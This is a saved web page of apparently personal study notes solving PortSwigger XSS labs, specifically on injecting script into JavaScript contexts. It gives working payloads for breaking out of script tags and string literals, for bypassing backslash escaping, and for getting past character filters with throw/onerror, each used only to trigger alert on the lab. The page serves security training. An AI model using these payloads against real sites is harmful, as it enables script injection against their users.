<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.15">
<link rel="alternate" type="application/rss+xml" href="/Cybernotes/blog/rss.xml" title="Cybernotes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Cybernotes/blog/atom.xml" title="Cybernotes Atom Feed">
<link rel="search" type="application/opensearchdescription+xml" title="Cybernotes" href="/Cybernotes/opensearch.xml"><title data-react-helmet="true">XSS-Into-Javascript | Cybernotes</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:image" content="https://shivam1317.github.io/Cybernotes/img/book.png"><meta data-react-helmet="true" name="twitter:image" content="https://shivam1317.github.io/Cybernotes/img/book.png"><meta data-react-helmet="true" property="og:url" content="https://shivam1317.github.io/Cybernotes/docs/portswigger/XSS/XSS-Into-Javascript"><meta data-react-helmet="true" name="docsearch:language" content="en"><meta data-react-helmet="true" name="docsearch:version" content="current"><meta data-react-helmet="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" name="google-site-verification" content="QR87sedAl37ED2yeGmgSmXKX6r3GfBffBjunkUFl0rI"><meta data-react-helmet="true" property="og:title" content="XSS-Into-Javascript | Cybernotes"><meta data-react-helmet="true" name="description" content="XSS into JavaScript"><meta data-react-helmet="true" property="og:description" content="XSS into JavaScript"><link data-react-helmet="true" rel="icon" href="/Cybernotes/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://shivam1317.github.io/Cybernotes/docs/portswigger/XSS/XSS-Into-Javascript"><link data-react-helmet="true" rel="alternate" href="https://shivam1317.github.io/Cybernotes/docs/portswigger/XSS/XSS-Into-Javascript" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://shivam1317.github.io/Cybernotes/docs/portswigger/XSS/XSS-Into-Javascript" hreflang="x-default"><link data-react-helmet="true" rel="preconnect" href="https://ABHJYS7Q6I-dsn.algolia.net" crossorigin="anonymous"><link rel="stylesheet" href="/Cybernotes/assets/css/styles.b0445982.css">
<link rel="preload" href="/Cybernotes/assets/js/runtime~main.3f3644df.js" as="script">
<link rel="preload" href="/Cybernotes/assets/js/main.6f91976f.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Cybernotes/"><div class="navbar__logo"><img src="/Cybernotes/img/book.png" alt="cybernotes" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/Cybernotes/img/book.png" alt="cybernotes" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">Cybernotes</b></a><a class="navbar__item navbar__link navbar__link--active" href="/Cybernotes/docs/intro">Notes</a><a class="navbar__item navbar__link" href="/Cybernotes/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/shivam1317/Cybernotes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link header-github-link" aria-label="GitHub repository"></a><div class="toggle_Pssr toggle_TdHA toggleChecked_cnQY toggleDisabled_jDku"><div class="toggleTrack_SSoT" role="button" tabindex="-1"><div class="toggleTrackCheck_XobZ"><span class="toggleIcon_eZtF">ðŸŒœ</span></div><div class="toggleTrackX_YkSC"><span class="toggleIcon_eZtF">ðŸŒž</span></div><div class="toggleTrackThumb_uRm4"></div></div><input type="checkbox" checked="" class="toggleScreenReader_JnkT" aria-label="Switch between dark and light mode"></div><div class="searchBox_qEbK"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_P2Lg"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><aside class="theme-doc-sidebar-container docSidebarContainer_rKC_"><div class="sidebar_CW9Y"><nav class="menu thin-scrollbar menu_SkdO"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" href="/Cybernotes/docs/intro">Welcome</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_VCh3" aria-current="page" href="/Cybernotes/docs/portswigger/Authentication/Brute-force attacks">Portswigger labs</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/Authentication/Brute-force attacks">Authentication</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/Business-logic/Lab-1 Excessive-trust-in-client-side-controls">Business-logic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/Directory-traversal/Lab-1">Directory-traversal</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/Command-Injection/Intro">Command-Injection</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/File-upload/Lab-1 Unrestricted-file-uploads">File-upload</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/Information-disclosure/Lab-1 Error messages">Information-disclosure</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/Sql-injection/Blind Sqli with out-of-band interaction">Sql-injection</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/SSRF/Blind SSRF">SSRF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_VCh3" aria-current="page" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Intro">XSS</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Intro">Intro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/XSS-Lab-2">XSS-Lab-2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/XSS-Lab-3">XSS-Lab-3</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Reflected-XSS">Reflected XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Reflected-XSS-with-some-SVG-markup-allowed">Lab: Reflected XSS with some SVG markup allowed</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Stored-XSS">Stored XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/DOM-XSS">DOM-XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/DOM-XSS-With-reflected-and-Stored-Data">DOM-XSS-With-reflected-and-Stored-Data</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/DOM-XSS-In-Third-Party-Apps">DOM-XSS-In-Third-Party-Apps</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Content-Security-Policy">Content-Security-Policy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Exploiting-XSS-Vulnerabilities">Exploiting cross-site scripting vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/Making-use-of-HTML-encoding">Making-use-of-HTML-encoding</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/XSS-In-HTML-Tag-Attributes">XSS-In-HTML-Tag-Attributes</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/XSS-Into-Javascript">XSS-Into-Javascript</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/Cybernotes/docs/portswigger/XSS/XSS-without-events">XSS-without-events</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_VCh3" tabindex="0" href="/Cybernotes/docs/portswigger/XXE/intro">XXE</a></div></li></ul></li></ul></nav></div></aside><main class="docMainContainer_TCnq"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><div class="tocCollapsible_jdIR theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_Fzxq">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>XSS-Into-Javascript</h1></header><h2 class="anchor anchorWithStickyNavbar_mojV" id="xss-into-javascript">XSS into JavaScript<a class="hash-link" href="#xss-into-javascript" title="Direct link to heading">â€‹</a></h2><p>When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="terminating-the-existing-script">Terminating the existing script<a class="hash-link" href="#terminating-the-existing-script" title="Direct link to heading">â€‹</a></h3><p>In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:</p><p><code>&lt;script&gt; ... var input = &#x27;controllable data here&#x27;; ... &lt;/script&gt;</code></p><p>then you can use the following payload to break out of the existing JavaScript and execute your own:</p><p><code>&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;</code></p><p>The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn&#x27;t prevent the subsequent script being parsed and executed in the normal way.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped<a class="hash-link" href="#lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped" title="Direct link to heading">â€‹</a></h2><blockquote><p>This lab contains a <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer">reflected cross-site scripting</a> vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code> function.</p></blockquote><p>--&gt; First of all i searched for <code>test</code> and intercepted request and response. I found that our searchItem was getting stored in variable and then it was encoding it so i tried this payload to break the script tag and enter our own xss payload which will trigger alert.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">&lt;/script&gt;&lt;img+src%3dx+onerror%3dalert(document.domain)&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>And i solved the lab!</p><p><img src="/Cybernotes/assets/images/Pastedimage20220313080132-939c523dd57cf5a6a9b05f8fc3d40724.png" width="1609" height="805"></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="breaking-out-of-a-javascript-string">Breaking out of a JavaScript string<a class="hash-link" href="#breaking-out-of-a-javascript-string" title="Direct link to heading">â€‹</a></h2><p>In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.</p><p>Some useful ways of breaking out of a string literal are:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">&#x27;-alert(document.domain)-&#x27;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">&#x27;;alert(document.domain)//</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded">Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded<a class="hash-link" href="#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded" title="Direct link to heading">â€‹</a></h2><blockquote><p>This lab contains a <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer">reflected cross-site scripting</a> vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code> function.</p></blockquote><p>--&gt; So first i searched for <code>hacker</code> and i got this part of response between <code>script</code> tags.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">&lt;script&gt;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">var searchTerms = &#x27;Hacker&#x27;;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;);</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">&lt;/script&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>So i used this payload to break the javascript :</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">&#x27;;alert(document.domain)//</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>And it triggered the alert and we solved the lab!</p><p><img src="/Cybernotes/assets/images/Pastedimage20220313124659-526e8efcf7dc12b5342a7494bce15aa7.png" width="1825" height="555"></p><hr><h2 class="anchor anchorWithStickyNavbar_mojV" id="bypassing-backslash">Bypassing backslash<a class="hash-link" href="#bypassing-backslash" title="Direct link to heading">â€‹</a></h2><p>Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.</p><p>For example, suppose that the input:</p><p><code>&#x27;;alert(document.domain)//</code></p><p>gets converted to:</p><p><code>\&#x27;;alert(document.domain)//</code></p><p>You can now use the alternative payload:</p><p><code>\&#x27;;alert(document.domain)//</code></p><p>which gets converted to:</p><p><code>\\&#x27;;alert(document.domain)//</code></p><p>Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped">Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped<a class="hash-link" href="#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped" title="Direct link to heading">â€‹</a></h2><p>--&gt; First i tried the previous payload which was this :</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">&#x27;;alert(document.domain)//</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>But the website is inserting backslash <code>\</code> before any quote:</p><p><img src="/Cybernotes/assets/images/Pastedimage20220313130652-d8661767e12ced168455364f0558795e.png" width="1799" height="703"></p><p>So then i tried to insert the payload which contains backslash by default and the backslash from the server will break it and we will be able to trigger alert!</p><p>So payload looks like this:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">\&#x27;;alert(document.domain)//</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>And as expected, website converted our backslash in <code>\\</code> and our alert function went to next line and got executed!</p><p><img src="/Cybernotes/assets/images/Pastedimage20220313131006-c97e4d8c038c403dd446718b749e2b8a.png" width="1725" height="713"></p><p>And we solved the lab!</p><hr><p>Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. One way of doing this is to use the <code>throw</code> statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the <code>alert()</code> function to the global exception handler and the <code>throw</code> statement passes the <code>1</code> to the exception handler (in this case <code>alert</code>). The end result is that the <code>alert()</code> function is called with <code>1</code> as an argument.</p><p><code>onerror=alert;throw 1</code></p><p>The next lab demonstrates a website that filters certain characters. You&#x27;ll have to use similar techniques to those described above in order to solve it.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked">Lab: Reflected XSS in a JavaScript URL with some characters blocked<a class="hash-link" href="#lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked" title="Direct link to heading">â€‹</a></h2><blockquote><p>This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer">XSS</a> attacks.
To solve the lab, perform a <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer">cross-site scripting</a> attack that calls the <code>alert</code> function with the string <code>1337</code> contained somewhere in the <code>alert</code> message.</p></blockquote><p>--&gt; i started by entering differnt payloads in post comment section because there were no search functionality in this website. I tried to get xss in <code>website</code> field as some previous labs but it didn&#x27;t worked :(</p><p>So after that i found that we have to inject payload in <code>postId</code> parameter. So i found this payload:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">postId=1&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>After decode it will be like this:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#d6deeb"><span class="token plain">&#x27;},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+&#x27;&#x27;,{x:&#x27;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In This payload, we are using exception handling and to make it work, we are using arrow functions here which are denoted with <code>x = x=&gt; {}</code> where x have the return value of function. So to display it we are converting it in string using <code>toString</code> method and we are overriding the toString method for the object which we will create later in payload and passing it to <code>x</code> and to show it on window we are using <code>window+&#x27;&#x27;</code> and we are passing the object which we want to convert which is <code>{x:&#x27;</code></p><p>Reference : <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString" target="_blank" rel="noopener noreferrer">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString</a></p><p>And after entering the above payload we solved the lab!</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/Cybernotes/docs/portswigger/XSS/XSS-In-HTML-Tag-Attributes"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">XSS-In-HTML-Tag-Attributes</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/Cybernotes/docs/portswigger/XSS/XSS-without-events"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">XSS-without-events</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#xss-into-javascript" class="table-of-contents__link toc-highlight">XSS into JavaScript</a><ul><li><a href="#terminating-the-existing-script" class="table-of-contents__link toc-highlight">Terminating the existing script</a></li></ul></li><li><a href="#lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped" class="table-of-contents__link toc-highlight">Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</a></li><li><a href="#breaking-out-of-a-javascript-string" class="table-of-contents__link toc-highlight">Breaking out of a JavaScript string</a></li><li><a href="#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded" class="table-of-contents__link toc-highlight">Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</a></li><li><a href="#bypassing-backslash" class="table-of-contents__link toc-highlight">Bypassing backslash</a></li><li><a href="#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped" class="table-of-contents__link toc-highlight">Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</a></li><li><a href="#lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked" class="table-of-contents__link toc-highlight">Lab: Reflected XSS in a JavaScript URL with some characters blocked</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contributing</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/Cybernotes/docs/contributing">How to contribute</a></li></ul></div><div class="col footer__col"><div class="footer__title">Contact me</div><ul class="footer__items"><li class="footer__item"><a href="https://medium.com/@0xSH1V4M" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Medium<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://discord.gg/wXQAxT8X9d" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://twitter.com/0xSH1V4M" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a href="https://oxsh1v4m.gitbook.io/webdev-notes/getting-started/welcome" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Development notes<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://github.com/shivam1317" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 Cybernotes</div></div></div></footer></div>
<script src="/Cybernotes/assets/js/runtime~main.3f3644df.js"></script>
<script src="/Cybernotes/assets/js/main.6f91976f.js"></script>
</body>
</html>